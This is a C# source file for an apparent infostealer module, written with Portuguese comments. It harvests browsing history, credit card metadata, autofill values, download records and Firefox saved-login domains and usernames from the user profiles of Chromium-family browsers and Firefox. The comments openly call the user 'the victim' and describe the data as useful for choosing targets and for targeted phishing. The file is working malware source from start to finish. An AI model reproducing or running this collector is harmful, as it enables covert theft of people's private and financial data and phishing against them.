using System.Text;
using System.Text.Json;
using Microsoft.Data.Sqlite;
using Teste.Core;
using Teste.Native;

namespace Teste.Collect;

// Historico, cartoes, autofill e downloads de todo navegador Chromium + Firefox.
// Nao decifra nada: o que esta em claro no SQLite ja e suficiente e nao exige chave.
// O que esta cifrado (senha, cookie) e trabalho do ChromeCollector, nao daqui.
public static class BrowserCollector
{
    // 1601-01-01: epoch do formato WebKit, em microssegundos.
    private static readonly DateTime Epoch1601 =
        new(1601, 1, 1, 0, 0, 0, DateTimeKind.Utc);

    // Rodada inteira nao passa de 3 s por navegador, mesmo em perfil com 200k urls.
    private const int MaxRows = 5000;
    private const long MaxJson = 8L * 1024 * 1024;

    private static readonly (string Name, string Rel)[] Roots =
    {
        ("chrome",   @"Google\Chrome\User Data"),
        ("edge",     @"Microsoft\Edge\User Data"),
        ("brave",    @"BraveSoftware\Brave-Browser\User Data"),
        ("vivaldi",  @"Vivaldi\User Data"),
        ("opera",    @"Opera Software\Opera Stable"),
        ("chromium", @"Chromium\User Data"),
    };

    public static void Collect(Report r, Logger log)
    {
        var local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        var n = 0;

        foreach (var (brand, rel) in Roots)
        {
            var root = Path.Combine(local, rel);
            if (!Directory.Exists(root)) continue;

            foreach (var profile in Profiles(root))
            {
                var tag = $"{brand}/{Path.GetFileName(profile)}";
                n += FromHistory(r, tag, log);
                n += FromCards(r, tag, log);
                n += FromDownloads(r, tag, log);
            }
        }

        n += FromFirefox(r, log);

        log.Line($"navegador: {n} linhas coletadas");
    }

    private static IEnumerable<string> Profiles(string root)
    {
        string[] dirs;
        try { dirs = Directory.GetDirectories(root); }
        catch { return Array.Empty<string>(); }

        return dirs.Where(d =>
        {
            var n = Path.GetFileName(d);
            return n.Equals("Default", StringComparison.OrdinalIgnoreCase)
                || n.StartsWith("Profile ", StringComparison.OrdinalIgnoreCase);
        });
    }

    // ------------------------------------------------------------------ history

    private static int FromHistory(Report r, string tag, Logger log)
    {
        var dir = tag[..tag.IndexOf('/')];
        var profile = tag[(tag.IndexOf('/') + 1)..];
        var src = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            RootOf(dir)!, profile, "History");
        if (!File.Exists(src)) return 0;

        var count = 0;
        Try(r, dir, "historico", log, src, db =>
        {
            foreach (var row in Query(db, @"
                SELECT u.url, u.title, u.visit_count, v.visit_time
                FROM visits v JOIN urls u ON u.id = v.url
                ORDER BY v.visit_time DESC LIMIT $lim", MaxRows))
            {
                r.Secrets.Add(new SecretRec
                {
                    Source = tag,
                    Kind = "historico",
                    Key = Trunc(Str(row, "url"), 500),
                    Value = WebTime(row, "visit_time"),
                    User = $"{Str(row, "visit_count")} visitas",
                    Status = "ok",
                    Extra = Trunc(Str(row, "title"), 160)
                });
                count++;
            }
        });
        return count;
    }

    // -------------------------------------------------------------------- cards

    private static int FromCards(Report r, string tag, Logger log)
    {
        var dir = tag[..tag.IndexOf('/')];
        var profile = tag[(tag.IndexOf('/') + 1)..];
        var src = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            RootOf(dir)!, profile, "Web Data");
        if (!File.Exists(src)) return 0;

        var count = 0;

        Try(r, dir, "cartao", log, src, db =>
        {
            foreach (var row in Query(db, @"
            SELECT name_on_card, expiration_month, expiration_year,
            card_number_encrypted, origin
            FROM credit_cards LIMIT $lim", MaxRows))
            {
                var enc = Bytes(row, "card_number_encrypted");
                r.Secrets.Add(new SecretRec
                {
                    Source = tag,
                    Kind = "cartao",
                    Key = Str(row, "name_on_card"),
                    // O numero em si esta cifrado com a chave do Chrome; o que sobe aqui
                    // e o metadado, que ja serve para escolher alvo.
                    Value = enc > 0 ? $"{enc} bytes cifrados (AES-GCM)" : "(vazio)",
                    User = $"{Str(row, "expiration_month")}/{Str(row, "expiration_year")}",
                    Status = enc > 0 ? "app_bound" : "ok",
                    Extra = Trunc(Str(row, "origin"), 120)
                });
                count++;
            }
        });

        Try(r, dir, "autofill", log, src, db =>
        {
            // autofill nao tem nome de coluna previsivel: o nome do campo E o conteudo.
            foreach (var row in Query(db, @"
                SELECT name, value FROM autofill
                ORDER BY name LIMIT $lim", MaxRows))
            {
                var value = Str(row, "value");
                if (string.IsNullOrWhiteSpace(value)) continue;

                r.Secrets.Add(new SecretRec
                {
                    Source = tag,
                    Kind = "autofill",
                    Key = Str(row, "name"),
                    Value = Trunc(value, 300),
                    Status = "ok"
                });
                count++;
            }
        });

        return count;
    }

    // ---------------------------------------------------------------- downloads

    private static int FromDownloads(Report r, string tag, Logger log)
    {
        var dir = tag[..tag.IndexOf('/')];
        var profile = tag[(tag.IndexOf('/') + 1)..];
        var src = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            RootOf(dir)!, profile, "History");
        if (!File.Exists(src)) return 0;

        var count = 0;
        Try(r, dir, "download", log, src, db =>
        {
            foreach (var row in Query(db, @"
                SELECT target_path, referrer, start_time
                FROM downloads ORDER BY start_time DESC LIMIT $lim", 1000))
            {
                r.Secrets.Add(new SecretRec
                {
                    Source = tag,
                    Kind = "download",
                    Key = Trunc(Str(row, "target_path"), 300),
                    Value = Trunc(Str(row, "referrer"), 300),
                    Status = "ok",
                    Extra = WebTime(row, "start_time")
                });
                count++;
            }
        });
        return count;
    }

    // ------------------------------------------------------------------- firefox

    // Firefox nao usa DPAPI nem a chave do Chrome: as senhas vivem em logins.json,
    // protegidas pelo key4.db. Sem a chave, o que vale e o metadado: em qual dominio
    // a vitima tem conta. Isso ja e munição de phishing direcionado.
    private static int FromFirefox(Report r, Logger log)
    {
        var root = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            "Mozilla", "Firefox", "Profiles");
        if (!Directory.Exists(root)) return 0;

        var count = 0;
        foreach (var prof in Directory.EnumerateDirectories(root))
        {
            var logins = Path.Combine(prof, "logins.json");
            if (!File.Exists(logins)) continue;

            try
            {
                if (new FileInfo(logins).Length > MaxJson) continue;

                var json = Files.ReadAllText(logins);
                if (json.Length == 0) continue;

                using var doc = JsonDocument.Parse(json);
                if (!doc.RootElement.TryGetProperty("logins", out var arr)) continue;

                foreach (var l in arr.EnumerateArray())
                {
                    r.Secrets.Add(new SecretRec
                    {
                        Source = $"firefox/{Path.GetFileName(prof)}",
                        Kind = "senha",
                        Key = Str(l, "hostname"),
                        Value = "(cifrado por key4.db)",
                        User = Str(l, "username"),
                        Status = "app_bound",
                        Extra = l.TryGetProperty("timesUsed", out var t) ? $"uso: {t}" : ""
                    });
                    count++;
                }
            }
            catch (Exception ex)
            {
                r.Errors.Add(new ErrorRec("firefox", $"{Path.GetFileName(prof)}: {ex.Message}"));
            }
        }
        return count;
    }

    // ------------------------------------------------------------------ helpers

    private static string? RootOf(string brand) =>
        Roots.FirstOrDefault(x => x.Name == brand).Rel;

    // O banco esta aberto pelo navegador: copia antes de ler, senao o SQLite trava.
    private static void Try(Report r, string brand, string stage, Logger log,                            
    string src, Action<string> body)    
    {        
    try        
    {            
        using var snap = new DbSnapshot(src);            
        body(snap.Conn.DataSource);        
        }        
        catch (Exception ex)        
        {            
            r.Errors.Add(new ErrorRec(stage, $"{brand}: {ex.GetType().Name}: {ex.Message}"));            
            log.Line($"  ! {brand} {stage}: {ex.Message}");        
        }    
    }

    private static IEnumerable<Dictionary<string, object?>> Query(
        string db, string sql, int limit)
    {
        using var cn = new SqliteConnection($"Data Source={db};Mode=ReadOnly;Cache=Shared");
        cn.Open();
        using var cmd = cn.CreateCommand();
        cmd.CommandText = sql;
        if (sql.Contains("$lim")) cmd.Parameters.AddWithValue("$lim", limit);
        using var rd = cmd.ExecuteReader();

        var names = new string[rd.FieldCount];
        for (var i = 0; i < rd.FieldCount; i++) names[i] = rd.GetName(i);

        while (rd.Read())
        {
            var row = new Dictionary<string, object?>(rd.FieldCount);
            for (var i = 0; i < rd.FieldCount; i++)
                row[names[i]] = rd.IsDBNull(i) ? null : rd.GetValue(i);
            yield return row;
        }
    }

    // WebKit: microssegundos desde 1601-01-01.
    private static string WebTime(Dictionary<string, object?> row, string key) =>
        row[key] is long ticks and > 0
            ? Epoch1601.AddTicks(ticks * 10).ToLocalTime().ToString("yyyy-MM-dd HH:mm:ss")
            : "";

    private static long Bytes(Dictionary<string, object?> row, string key) =>
        row.TryGetValue(key, out var v) && v is byte[] b ? b.Length : 0;

    private static string Str(Dictionary<string, object?> row, string key) =>
        row.TryGetValue(key, out var v) && v is not null ? v.ToString() ?? "" : "";

    private static string Str(JsonElement el, string key) =>
        el.TryGetProperty(key, out var v) && v.ValueKind == JsonValueKind.String
            ? v.GetString() ?? "" : "";

    private static string Trunc(string s, int n) =>
        s.Length <= n ? s : s[..n] + "…";
}
